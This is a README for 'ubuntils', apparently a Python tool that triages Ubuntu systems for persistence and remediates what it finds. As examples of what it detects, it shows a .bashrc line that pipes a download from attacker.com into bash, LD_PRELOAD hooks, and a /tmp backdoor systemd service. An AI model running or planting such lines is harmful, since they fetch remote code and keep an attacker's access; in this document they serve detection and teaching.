# ubuntils - Ubuntu Incident Response Forensics Tool

Fast, native Linux forensics for rapid Ubuntu system triage, persistence detection, and automated remediation. Built to solve a real gap in incident response workflows.

![Build Status](https://img.shields.io/badge/status-development-yellow)
![Python](https://img.shields.io/badge/python-3.9+-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Tested On](https://img.shields.io/badge/tested-amd64%20|%20x86__64%20|%20arm64-brightgreen)
![Ubuntu](https://img.shields.io/badge/ubuntu-20.04%20|%2022.04%20|%2024.04-orange)

---

## Table of Contents

1. [The Problem](#the-problem)
2. [How ubuntils Solves It](#how-ubuntils-solves-it)
3. [How It Works](#how-it-works)
4. [What It Detects](#what-it-detects)
5. [Installation](#installation)
6. [Usage Guide](#usage-guide)
7. [Getting the Most Out of ubuntils](#getting-the-most-out-of-ubuntils)
8. [Example Outputs](#example-outputs)
9. [Architecture](#architecture)
10. [Testing & Compatibility](#testing--compatibility)
11. [Security Considerations](#security-considerations)
12. [Roadmap](#roadmap)
13. [Contributing](#contributing)
14. [License](#license)

---

## The Problem

### The Gap in Incident Response

During a DFIR course and while building a home SOC around Wazuh, Velociraptor, MISP, and Shuffle, I ran into a problem that most incident responders know well:

**Most forensics tools require Windows, or are so fragmented on Linux that triage becomes a manual, error-prone grind.**

- EnCase, Autopsy, and FTK are Windows-first — running them on Linux requires emulation or remote overhead
- Volatility 3 is excellent for memory forensics but requires a pre-captured dump — no live triage
- Everything else is a chain of manual commands across multiple tools with no standardized output

Meanwhile, production infrastructure is overwhelmingly Ubuntu. Most web servers, cloud VMs, and containers run it. Yet the forensics tooling for Ubuntu specifically is sparse, outdated, or GUI-dependent.

### The Real Workflow Pain

When a Ubuntu system gets compromised, incident response currently looks like this:

```
1.  SSH into the system
2.  Run `ps aux --forest`              → Manually scan process tree
3.  Run `netstat -tlpn`                → Check for unexpected ports
4.  Run `lsof -i`                      → Look for suspicious connections
5.  Manually read /var/log/syslog      → Look for anomalies
6.  Manually read /var/log/auth.log    → Check login attempts and failures
7.  Read journalctl output             → Cross-reference systemd events
8.  Check /etc/cron.d/* + crontabs     → Find cron-based persistence
9.  Check /etc/systemd/system/         → Find suspicious timers or services
10. Read /etc/sudoers + /etc/sudoers.d → Look for NOPASSWD abuse
11. Check ~/.ssh/authorized_keys       → Find backdoor SSH keys
12. Read ~/.bashrc, ~/.zshrc           → Look for LD_PRELOAD or shell hooks
13. Check /etc/ld.so.preload           → Find rootkit injection points
14. Manually correlate timestamps      → Try to build a timeline
15. Write a report                     → Document everything found
```

This takes 30 to 40 minutes per system, is inconsistent across analysts, produces no standardized output, and has no automation for remediation — every fix is a manual file edit with no backup and no rollback.

---

## How ubuntils Solves It

ubuntils consolidates that entire workflow into a single native CLI tool.

```bash
sudo ubuntils scan
```

One command runs parallel artifact collection across all relevant locations, applies 8 detection rules tuned specifically for Ubuntu persistence mechanisms, builds a chronological timeline from correlated log events, and produces a structured report — in about 5 seconds.

When you are ready to act on findings:

```bash
sudo ubuntils scan --remediate --dry-run    # Preview every fix before applying
sudo ubuntils scan --remediate --confirm    # Apply with timestamped backups
sudo ubuntils rollback /var/backups/ubuntils_TIMESTAMP/    # Undo everything
```

### Design Principles

**Native Linux first.** No emulation, no Windows dependency, no GUI. ubuntils runs where your infrastructure runs.

**Speed without sacrifice.** Artifact collection runs in parallel. You get results in seconds without missing anything.

**Safety-first remediation.** Every fix creates a timestamped backup before touching anything, validates the change before applying it, and provides a single rollback command to undo the entire session.

**Open and auditable.** Every detection rule is documented, readable, and improvable. Nothing is a black box.

**Integration ready.** JSON output feeds directly into SIEM, MISP, TheHive, or any other tool in your stack.

---

## How It Works

ubuntils runs every scan through a fixed pipeline: collect, detect, build timeline, optionally remediate, then format and output.

### Artifact Collection

Four collectors run in parallel. Total collection time is bounded by the slowest collector, not the sum of all.

**ProcessCollector** runs `ps aux --forest` to capture the full process tree including parent-child relationships, `lsof -i` for open network connections per process, and `netstat -tlpn` / `netstat -tnp` for listening ports and established connections. This tells you what is running, what it is connected to, and whether the process tree has unusual relationships such as a web server spawning a shell.

**LogCollector** parses `/var/log/syslog`, `/var/log/auth.log`, `journalctl` output, and `/var/log/audit/audit.log` if auditd is running. Each source uses a different parsing strategy because syslog text, binary journal, and audit records have different formats. Output is a flat list of timestamped events sorted chronologically.

**FilesystemCollector** reads every relevant persistence location: `/etc/cron.d/`, system cron directories, user crontabs via `crontab -u <user> -l`, systemd timer and service files, `/etc/sudoers` and everything in `/etc/sudoers.d/`, `~/.ssh/authorized_keys` for all users, shell initialization files per user, and `/etc/ld.so.preload` plus environment LD_PRELOAD values.

**UserCollector** reads `/etc/passwd` and `/etc/group` to build a picture of all users, their UIDs, shells, and group memberships, then checks `last`, `lastlog`, and `who` for recent login activity.

### Persistence Detection

The rule engine takes collected artifacts and applies 8 rules. Each rule checks one specific condition and returns a finding with severity, path, reason, and remediation availability if the condition is met. Rules are conservative — a finding is only generated on concrete, specific evidence, not vague heuristics. See [What It Detects](#what-it-detects) for a full breakdown.

### Timeline Building

The timeline builder sorts all log events by timestamp, then correlates events close in time involving the same user, process, or file into a readable sequence. A SSH login at 14:00, a sudo execution at 14:05, and a `.bashrc` modification at 14:10 appear as a connected sequence rather than three unrelated log lines.

### Remediation

When `--remediate` is passed, the remediation engine acts on findings flagged `remediation_available: true`. Every module follows the same pattern: identify the artifact, create a timestamped backup in `/var/backups/ubuntils/TIMESTAMP/`, validate the change (e.g. `visudo -cf` for sudoers), apply it, verify it landed, and log the action. If any step fails the module stops without leaving the system in a partially modified state.

Findings flagged as manual-review-only (Rules 7 and 8) are never auto-fixed. These require human judgment no rule engine can replace.

---

## What It Detects

### Rule 1: Cron Root Execution (HIGH)

**What it checks:** User crontabs where a non-root user has entries running commands with elevated context or pointing to root-owned paths.

**Why it matters:** An attacker with a compromised non-root account can plant a cron job that executes repeatedly with elevated privileges, giving persistent escalation without needing to exploit anything again.

**Example:**
```
User: ubuntu
Cron: */5 * * * * /tmp/check_disk.sh
Running with elevated context
```

**Auto-fix:** Remove the cron entry. Backup created at `/var/spool/cron/crontabs/ubuntu.backup.TIMESTAMP`.

---

### Rule 2: Cron /tmp Paths (HIGH)

**What it checks:** Any cron job referencing a path in `/tmp`, `/var/tmp`, or `/dev/shm`.

**Why it matters:** These directories are world-writable. Legitimate software never needs cron jobs pointing there. Attackers stage malware in `/tmp` because it is always writable and often monitored less aggressively than system directories.

**Example:**
```
Cron: */1 * * * * /tmp/update_check.sh
```

**Auto-fix:** Remove the cron entry.

---

### Rule 3: LD_PRELOAD Injection (HIGH)

**What it checks:** LD_PRELOAD set in `/etc/ld.so.preload` or in any user's shell initialization files, pointing to a library outside standard system paths (`/lib`, `/usr/lib`, `/lib64`, `/usr/lib64`).

**Why it matters:** LD_PRELOAD forces a shared library to load into every process before any other library. This is the mechanism behind many Linux rootkits and credential harvesters — it lets an attacker intercept system calls, hide files, or steal passwords transparently.

**Example:**
```
/etc/ld.so.preload: /tmp/libhook.so
OR
~/.bashrc: export LD_PRELOAD=/var/tmp/logger.so
```

**Auto-fix:** Comment out the LD_PRELOAD line. Original file backed up before modification.

---

### Rule 4: Sudoers NOPASSWD (MEDIUM)

**What it checks:** Any sudoers entry granting NOPASSWD access to a non-root, non-system user.

**Why it matters:** NOPASSWD means an attacker who compromises that account can run any allowed command as root without knowing the password. It survives reboots and is commonly overlooked in post-incident cleanup.

**Example:**
```
ubuntu ALL=(ALL) NOPASSWD: /usr/bin/apt-get
```

**Auto-fix:** Remove the NOPASSWD clause. Validated with `visudo -cf` before applying. Backup created.

---

### Rule 5: Shell Initialization Hijacking (MEDIUM)

**What it checks:** Shell initialization files (`.bashrc`, `.zshrc`, `.bash_profile`, `.profile`) containing suspicious patterns: `curl`/`wget` downloads, LD_PRELOAD exports, base64-decoded execution, or reverse shell indicators.

**Why it matters:** Shell init files run every time a user opens a terminal or logs in. An attacker can plant a reverse shell or credential harvester here that re-executes on every login with no cron job needed.

**Example:**
```
.bashrc:
export LD_PRELOAD=/tmp/liblogger.so
curl -s http://attacker.com/implant.sh | bash
```

**Auto-fix:** Comment out the suspicious lines. Backup created before modification.

---

### Rule 6: SSH Key Injection (HIGH)

**What it checks:** Entries in `~/.ssh/authorized_keys` for all users added recently based on file modification timestamps, or not matching a configured whitelist.

**Why it matters:** An injected SSH key is one of the cleanest possible backdoors — silent, password-free access that persists even after the original exploit is patched. Many responders check root's authorized_keys and miss the same file for every other user.

**Example:**
```
~/.ssh/authorized_keys:
ssh-rsa AAAAB3Nz... unknown@attacker
```

**Auto-fix:** Remove the unrecognized key entry. Full authorized_keys backup created first.

---

### Rule 7: Non-Standard Systemd Services (MEDIUM)

**What it checks:** Systemd service files outside `/etc/systemd/system/`, `/usr/lib/systemd/system/`, and `/lib/systemd/system/`, or service files whose `ExecStart` points to `/tmp`, `/home`, `/var/tmp`, or `/dev/shm`.

**Why it matters:** Attackers create systemd services for persistence because they survive reboots. Placing them in writable directories means root is not needed to create them.

**Example:**
```
/tmp/malicious.service
[Service]
ExecStart=/tmp/backdoor
Restart=always
```

**Auto-fix:** Not available — manual review required. Automatically disabling a service risks breaking legitimate software if this rule produces a false positive.

---

### Rule 8: System File Modification Timestamps (MEDIUM)

**What it checks:** Critical system files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/hosts`) whose modification timestamp falls within a configurable recent window (default: 30 days).

**Why it matters:** Stable systems rarely have `/etc/passwd` modified. A recent change means either an admin added a user or an attacker did. Either way it warrants investigation.

**Example:**
```
/etc/passwd last modified: 5 days ago
/etc/shadow last modified: 5 days ago
```

**Auto-fix:** Not available — the modification may be legitimate. Manual diff and review required before any action.

---

## Installation

### Requirements

- **OS:** Ubuntu 20.04 LTS, 22.04 LTS, or 24.04 LTS
- **Architecture:** x86-64 (amd64) or ARM64 (arm64)
- **Python:** 3.9 or higher
- **Permissions:** Root or sudo access for full artifact collection

### From Source

```bash
git clone https://github.com/asmitdesai/ubuntils.git
cd ubuntils

python3 -m venv venv
source venv/bin/activate

pip install -e .

ubuntils --version
ubuntils --help
```

### From PyPI (Coming Soon)

```bash
pip install ubuntils
```

### Dependencies

ubuntils uses minimal external dependencies. All heavy lifting goes through standard Linux system commands via subprocess.

```
click>=8.1.0          # CLI framework and argument parsing
pyyaml>=6.0           # Configuration file support
python-dateutil>=2.8  # Robust date and time parsing across log formats
tabulate>=0.9.0       # Clean table formatting for human-readable output
loguru>=0.7.0         # Structured logging with file and stream handlers
```

---

## Usage Guide

### Commands

```bash
# Detection only (read-only, no changes made to the system)
sudo ubuntils scan

# Save report to a file
sudo ubuntils scan --output /tmp/report.txt

# JSON output for SIEM, scripting, or piping
sudo ubuntils scan --output json

# Preview every remediation fix without applying anything
sudo ubuntils scan --remediate --dry-run

# Apply fixes with timestamped backups
sudo ubuntils scan --remediate --confirm

# Restore system to pre-remediation state
sudo ubuntils rollback /var/backups/ubuntils_TIMESTAMP/

# List available rollback points
sudo ubuntils rollback --list

# Verbose debug output
sudo ubuntils scan -v
```

### Flags Reference

| Flag | Description |
|------|-------------|
| `--output human` | Human-readable report to stdout (default) |
| `--output json` | Structured JSON to stdout |
| `--output /path/file` | Save report to a specific file |
| `--remediate` | Enable remediation engine |
| `--dry-run` | Preview changes without applying (requires --remediate) |
| `--confirm` | Apply changes with backups (requires --remediate) |
| `-v / --verbose` | Enable debug-level logging |

---

## Getting the Most Out of ubuntils

### Recommended Incident Response Workflow

**1. Run detection-only first.** Never start with remediation. Get the full picture before touching anything.

```bash
sudo ubuntils scan
```

Read every finding. Pay attention to the timeline — it shows the sequence of events, not just isolated artifacts. HIGH severity findings need immediate investigation. MEDIUM findings need review before you decide to act.

**2. Save your initial state as JSON.** This is your forensic record of the system before any changes.

```bash
sudo ubuntils scan --output json > /tmp/triage_$(hostname)_$(date +%Y%m%d_%H%M%S).json
```

**3. Preview remediation before applying it.**

```bash
sudo ubuntils scan --remediate --dry-run
```

For each proposed change, ask: is this finding definitely malicious, or could it be a legitimate admin action? If you are not sure, do not auto-fix it.

**4. Apply fixes when you are confident.**

```bash
sudo ubuntils scan --remediate --confirm
```

Note the backup directory path in the output. You will need it if rollback is required.

**5. Verify the fixes landed.**

```bash
sudo ubuntils scan
```

Remediated findings should no longer appear. If any HIGH findings remain, they were either manual-review-only or the fix did not apply correctly — both cases are reported clearly.

**6. Export the clean post-remediation state.**

```bash
sudo ubuntils scan --output json > /tmp/post_remediation_$(hostname)_$(date +%Y%m%d_%H%M%S).json
```

---

### Integrating with Your Security Stack

**MISP:** The `findings` array in JSON output contains concrete IOCs — file paths, commands, key fingerprints. Use `jq` to extract HIGH severity findings and import them as a MISP event.

```bash
sudo ubuntils scan --output json | jq '.findings[] | select(.severity == "HIGH")'
```

**Wazuh:** ubuntils can run as a custom Wazuh active response script or scheduled command. The JSON output ingests as a custom log source for centralized alerting across endpoints.

**TheHive:** Each finding maps to a TheHive observable. Severity becomes a tag, path becomes the observable value, recommendation becomes a note, and the timeline maps to case timeline entries.

**Velociraptor:** Use Velociraptor for memory artifacts and network forensics across a fleet. Use ubuntils for live artifact collection and persistence detection on individual Ubuntu endpoints. They complement each other.

---

### Tips

**Run as root, not just sudo.** While sudo works for most collection, root access ensures every artifact location is readable including `/proc/[pid]/environ` and `/etc/shadow`.

**Triage before rebooting.** A reboot clears running processes, active network connections, and temporary files. Always run ubuntils first.

**Do not skip dry-run on production systems.** Five seconds reviewing the dry-run output can save you from breaking a running service.

**Understand what manual-review means.** Rules 7 and 8 are flagged but never auto-fixed. A recently modified `/etc/passwd` could be an attacker or a legitimate admin. ubuntils tells you to look — you decide what to do.

**Test rollback before you need it.** In a lab, plant a cron job, run `--confirm`, verify it was removed, then run rollback and verify it came back. Knowing rollback works before a real incident removes significant pressure.

---

## Example Outputs

### Human-Readable Report

```
===== UBUNTU FORENSICS TRIAGE REPORT =====
Generated:    2024-06-15 14:23:45 UTC
Hostname:     web-server-01
Kernel:       5.15.0-101-generic
Uptime:       45 days
Scan Mode:    DETECTION ONLY
Duration:     4.82 seconds

----- EXECUTION SUMMARY -----
Artifacts Collected: 847
Findings:            5 (2 HIGH, 2 MEDIUM, 1 LOW)
Remediation Available: 4 of 5

----- SUSPICIOUS FINDINGS -----

[HIGH] Cron Root Execution by Non-Root User
  ID:             FINDING_001
  Location:       /var/spool/cron/crontabs/ubuntu
  Owner:          ubuntu
  Command:        /tmp/check_disk.sh
  Interval:       */5 * * * * (every 5 minutes)
  Modified:       2024-06-10 14:32:15 UTC (5 days ago)
  Why:            Non-root user cron executing /tmp path with elevated context
  Auto-Fix:       AVAILABLE
  Recommendation: Investigate /tmp/check_disk.sh immediately

[HIGH] LD_PRELOAD Injection in Shell Init File
  ID:             FINDING_002
  Location:       /home/ubuntu/.bashrc
  Value:          LD_PRELOAD=/tmp/libx.so
  Modified:       2024-06-10 09:15:22 UTC (5 days ago)
  Why:            LD_PRELOAD outside standard library paths; rootkit indicator
  Auto-Fix:       AVAILABLE
  Recommendation: Examine /tmp/libx.so; likely credential harvester or rootkit

[MEDIUM] Sudoers NOPASSWD for Unprivileged User
  ID:             FINDING_003
  Location:       /etc/sudoers
  Entry:          ubuntu ALL=(ALL) NOPASSWD: /usr/bin/apt-get
  Why:            Passwordless sudo enables instant privilege escalation
  Auto-Fix:       AVAILABLE
  Recommendation: Verify if this was intentionally configured

[MEDIUM] Unexpected SSH Key in authorized_keys
  ID:             FINDING_004
  Location:       /home/ubuntu/.ssh/authorized_keys
  Key Comment:    unknown@host
  Modified:       2024-06-10 14:45:00 UTC (5 days ago)
  Why:            Key added recently with unknown origin
  Auto-Fix:       AVAILABLE
  Recommendation: Verify key ownership; remove if not recognized

[LOW] Critical System File Modified Recently
  ID:             FINDING_005
  Location:       /etc/passwd
  Modified:       2024-06-10 12:45:30 UTC (5 days ago)
  Why:            /etc/passwd is rarely modified on stable systems
  Auto-Fix:       NOT AVAILABLE (manual review required)
  Recommendation: Check for unauthorized accounts with `diff /etc/passwd /etc/passwd.bak`

----- TIMELINE (Last 48 Hours) -----
2024-06-15 14:00:22 | SSH LOGIN     | ubuntu | from 203.0.113.45 (SUCCESS)
2024-06-15 14:03:01 | SUDO          | ubuntu | /usr/bin/apt-get update
2024-06-15 14:05:44 | FILE MODIFIED | ubuntu | /home/ubuntu/.bashrc
2024-06-15 14:08:30 | CRON ADDED    | root   | /tmp/check_disk.sh (every 5 min)
2024-06-15 14:10:00 | CRON RAN      | root   | /tmp/check_disk.sh
2024-06-15 14:15:33 | FILE MODIFIED | root   | /etc/passwd
2024-06-15 14:40:01 | SSH ATTEMPT   | --     | from 203.0.113.50 (FAILED x5)
2024-06-15 15:05:12 | SSHD          | system | MaxAuthTries exceeded; 203.0.113.50 disconnected

----- ARTIFACT STATISTICS -----
Processes:       142 total (3 suspicious)
Network:          24 total (8 listening, 16 established)
Cron Jobs:         8 total (1 suspicious)
Systemd Timers:    5 total (0 suspicious)
Auth Events:     342 total (87 success, 255 failed)
SSH Keys:          3 total (1 suspicious)
Sudoers Entries:  12 total (1 NOPASSWD)

----- NEXT STEPS -----
  sudo ubuntils scan --remediate --dry-run
  sudo ubuntils scan --remediate --confirm
```

---

### Remediation Report

```
===== UBUNTU FORENSICS REMEDIATION REPORT =====
Generated:  2024-06-15 14:31:20 UTC
Hostname:   web-server-01
Scan Mode:  REMEDIATION (--confirm)
Backup Dir: /var/backups/ubuntils_20240615_143120/

----- REMEDIATION APPLIED -----

[OK] FINDING_001 - Cron Root Execution
  Action:  Removed /tmp/check_disk.sh entry from ubuntu crontab
  Backup:  /var/backups/ubuntils_20240615_143120/crontabs_ubuntu
  Status:  SUCCESS

[OK] FINDING_002 - LD_PRELOAD Injection
  Action:  Commented out LD_PRELOAD line in /home/ubuntu/.bashrc
  Before:  export LD_PRELOAD=/tmp/libx.so
  After:   # export LD_PRELOAD=/tmp/libx.so  [ubuntils 2024-06-15]
  Backup:  /var/backups/ubuntils_20240615_143120/ubuntu_.bashrc
  Status:  SUCCESS

[OK] FINDING_003 - Sudoers NOPASSWD
  Action:  Removed NOPASSWD clause; visudo syntax validated
  Backup:  /var/backups/ubuntils_20240615_143120/sudoers
  Status:  SUCCESS

[OK] FINDING_004 - SSH Key Injection
  Action:  Removed unknown@host key from authorized_keys
  Backup:  /var/backups/ubuntils_20240615_143120/ubuntu_authorized_keys
  Status:  SUCCESS

[SKIPPED] FINDING_005 - System File Modification
  Reason:  Manual review required; no auto-fix available

----- ROLLBACK -----
  sudo ubuntils rollback /var/backups/ubuntils_20240615_143120/
```

---

### JSON Output

```json
{
  "metadata": {
    "timestamp": "2024-06-15T14:23:45Z",
    "hostname": "web-server-01",
    "kernel": "5.15.0-101-generic",
    "uptime_days": 45,
    "scan_duration_seconds": 4.82,
    "ubuntils_version": "1.0.0",
    "scan_mode": "detection"
  },
  "summary": {
    "artifacts_collected": 847,
    "findings": { "high": 2, "medium": 2, "low": 1, "total": 5 },
    "remediation_available": 4
  },
  "findings": [
    {
      "id": "FINDING_001",
      "severity": "HIGH",
      "category": "cron_root_execution",
      "title": "Cron Root Execution by Non-Root User",
      "path": "/var/spool/cron/crontabs/ubuntu",
      "owner": "ubuntu",
      "command": "/tmp/check_disk.sh",
      "details": {
        "cron_interval": "*/5 * * * *",
        "last_modified": "2024-06-10T14:32:15Z",
        "days_since_modified": 5
      },
      "why_suspicious": "Non-root user cron executing /tmp path with elevated context",
      "remediation": {
        "available": true,
        "type": "cron_removal",
        "action": "Remove cron entry"
      },
      "recommendation": "Investigate /tmp/check_disk.sh immediately"
    },
    {
      "id": "FINDING_002",
      "severity": "HIGH",
      "category": "ld_preload_injection",
      "title": "LD_PRELOAD Injection in Shell Init File",
      "path": "/home/ubuntu/.bashrc",
      "details": {
        "value": "LD_PRELOAD=/tmp/libx.so",
        "file_modified": "2024-06-10T09:15:22Z",
        "days_since_modified": 5
      },
      "why_suspicious": "LD_PRELOAD outside standard library paths; rootkit indicator",
      "remediation": {
        "available": true,
        "type": "shell_cleanup",
        "action": "Comment out LD_PRELOAD line"
      },
      "recommendation": "Examine /tmp/libx.so for malicious behavior"
    }
  ],
  "timeline": [
    {
      "timestamp": "2024-06-15T14:00:22Z",
      "event_type": "ssh_login",
      "user": "ubuntu",
      "source_ip": "203.0.113.45",
      "status": "success"
    },
    {
      "timestamp": "2024-06-15T14:05:44Z",
      "event_type": "file_modified",
      "user": "ubuntu",
      "path": "/home/ubuntu/.bashrc"
    },
    {
      "timestamp": "2024-06-15T14:08:30Z",
      "event_type": "cron_added",
      "user": "root",
      "command": "/tmp/check_disk.sh"
    }
  ],
  "artifacts": {
    "processes": { "total": 142, "suspicious": 3 },
    "network": { "total": 24, "listening": 8, "established": 16 },
    "cron_jobs": { "total": 8, "suspicious": 1 },
    "systemd_timers": { "total": 5, "suspicious": 0 },
    "auth_events": { "total": 342, "successful": 87, "failed": 255 },
    "ssh_keys": { "total": 3, "suspicious": 1 },
    "sudoers_entries": { "total": 12, "nopasswd": 1 }
  }
}
```

---

## Architecture

```
ubuntils/
├── ubuntils/
│   ├── __init__.py
│   ├── cli.py                        # Click CLI entry point, commands, flags
│   ├── collectors/
│   │   ├── __init__.py
│   │   ├── processes.py              # ps, lsof, netstat
│   │   ├── logs.py                   # syslog, auth, journal, auditd
│   │   ├── filesystem.py             # cron, sudoers, SSH, shell, LD_PRELOAD
│   │   └── users.py                  # passwd, group, login activity
│   ├── detectors/
│   │   ├── __init__.py
│   │   ├── persistence.py            # 8 detection rules
│   │   └── anomalies.py              # Timeline anomaly detection
│   ├── remediators/
│   │   ├── __init__.py
│   │   ├── cron_remediation.py
│   │   ├── sudoers_remediation.py
│   │   ├── ssh_remediation.py
│   │   ├── ld_preload_remediation.py
│   │   ├── shell_remediation.py
│   │   ├── backup_manager.py         # Timestamped backup creation
│   │   └── rollback_manager.py       # Backup restoration
│   ├── formatters/
│   │   ├── __init__.py
│   │   ├── human.py                  # Human-readable report
│   │   └── json_formatter.py         # JSON output
│   └── utils/
│       ├── __init__.py
│       ├── shell.py                  # Safe subprocess wrappers
│       ├── logging.py                # loguru setup
│       └── validators.py             # Input validation
├── tests/
│   ├── test_collectors.py
│   ├── test_detectors.py
│   ├── test_remediators.py
│   └── test_integration.py
├── README.md
├── INSTALL.md
├── CONTRIBUTING.md
├── claude.md
├── requirements.txt
├── setup.py
└── .github/
    └── workflows/
        └── tests.yml
```

---

## Testing & Compatibility

### Platform Support

| Architecture | Status | Notes |
|---|---|---|
| ARM64 (arm64) | Primary | MacBook M4 Pro via Parallels — most frequent testing |
| AMD64 (x86-64) | Supported | Validated on native Ubuntu installs |
| x86 (32-bit) | Not supported | No planned support |

### Ubuntu Version Support

| Version | Status |
|---------|--------|
| Ubuntu 20.04 LTS | Supported and tested |
| Ubuntu 22.04 LTS | Supported and tested |
| Ubuntu 24.04 LTS | Supported and tested |

### Running the Test Suite

```bash
pip install pytest pytest-cov

pytest tests/
pytest --cov=ubuntils tests/       # With coverage report
pytest tests/test_detectors.py -v  # Single module, verbose
```

The test suite covers all 4 collectors, all 8 detection rules with known-bad and known-good inputs, backup creation and rollback, and end-to-end integration tests on planted artifacts. Target coverage is 80%+.

---

## Security Considerations

### Why Root Access Is Required

ubuntils needs root or sudo to read `/var/log/*`, `/etc/sudoers`, `/etc/shadow`, `/proc/[pid]/environ` for all processes, and other users' home directories and crontabs. For detection-only scans where full root is unavailable, ubuntils degrades gracefully — it skips unreadable artifacts and notes them in the output rather than failing.

### Remediation Safeguards

Every remediation action: creates a timestamped backup before touching anything, validates changes before applying (sudoers get `visudo -cf`, cron entries get verified post-removal), never removes all sudo access from a system, never force-deletes files (only comments out or removes specific entries), requires the explicit `--confirm` flag, and logs every action with timestamps for audit trail purposes.

### Running on Production Systems

Use detection-only mode or `--dry-run` before applying anything on production. Save JSON output before and after remediation as your incident record. Have the backup directory path from the `--confirm` output ready before you start in case rollback is needed.

---

## Roadmap

### v1.0.0 — Summer 2024

- [ ] Artifact collection (processes, logs, filesystem, users)
- [ ] 8 persistence detection rules
- [ ] Timeline building from log correlation
- [ ] Safe remediation with backups and rollback
- [ ] Human-readable and JSON output
- [ ] 80%+ test coverage
- [ ] AMD64 and ARM64 support
- [ ] Ubuntu 20.04, 22.04, 24.04 support

### v1.5.0 — Post-Summer

- [ ] VirusTotal API integration (hash lookups for flagged files)
- [ ] MISP integration (automatic IOC export)
- [ ] YAML-based custom rule configuration
- [ ] False positive whitelist support

### v2.0.0 — Future

- [ ] Web dashboard for report visualization
- [ ] Wazuh active response integration
- [ ] macOS support
- [ ] SOAR automation hooks

---

## Contributing

Contributions are most useful in these areas: new detection rules for lesser-known Ubuntu persistence mechanisms, additional collectors for artifact sources not currently covered, remediation modules for findings currently flagged as manual-review-only, test cases on different Ubuntu configurations and hardware, and documentation improvements.

See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, code style, and pull request process.

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

## Author

Built by **Asmit** — BTech CS, PES University, Bengaluru.

Built out of real frustration with the state of Ubuntu incident response tooling during a DFIR course and while building a home SOC. Every detection rule, remediation module, and design decision is documented and open to inspection.

---

## Support

- **Bug reports and feature requests:** [github.com/asmitdesai/ubuntils/issues](https://github.com/asmitdesai/ubuntils/issues)
- **Discussions:** [github.com/asmitdesai/ubuntils/discussions](https://github.com/asmitdesai/ubuntils/discussions)
- **Security issues:** Report privately via GitHub Security Advisory

---

**ubuntils: Automate Ubuntu incident response. Ship faster. Remediate smarter.**
